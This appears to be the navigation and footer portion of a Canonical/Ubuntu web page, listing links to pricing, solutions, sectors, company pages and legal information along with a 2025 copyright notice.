* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page


